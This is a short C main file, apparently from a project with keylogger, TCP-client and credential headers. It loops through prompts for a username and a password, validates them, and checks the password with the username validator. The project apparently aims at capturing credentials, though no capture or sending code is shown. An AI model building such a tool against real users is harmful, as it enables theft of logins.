#include "../headers/DataPackager.h"
#include "../headers/KeyLogger.h"
#include "../headers/StateManager.h"
#include "../headers/TCPClient.h"
#include "../headers/UserCredentials.h"
#include "../headers/ValidColors.h"

int main(int argc, char **argv)
{
	UserCredentials *userCredentials;
	stateType state;
	char *question, *response;
	char is_valid;

	/* initialize the UserCredentials struct */
	userCredentials = newUserCredentials();

	/* first state always GetUsername */
	state = GetUsername;

	/* StateManager Loop: Ask Questions until all credentials valid */
	while(state != Logging)
	{
		question = getQuestion(state);
		if(state == GetUsername)
		{
			askQuestion(&question);
			response = getResponse();
			is_valid = checkValidUsername(response);
			if(is_valid > 0)
			{
				setUsername(userCredentials, response);
			}
			setState(&state, is_valid);
		}
		else if(state == GetPassword)
		{
			askQuestion(&question);
			response = getResponse();
			is_valid = checkValidUsername(response);
			setState(&state, is_valid);
		}
		free(response);
	}
	return 0;
}
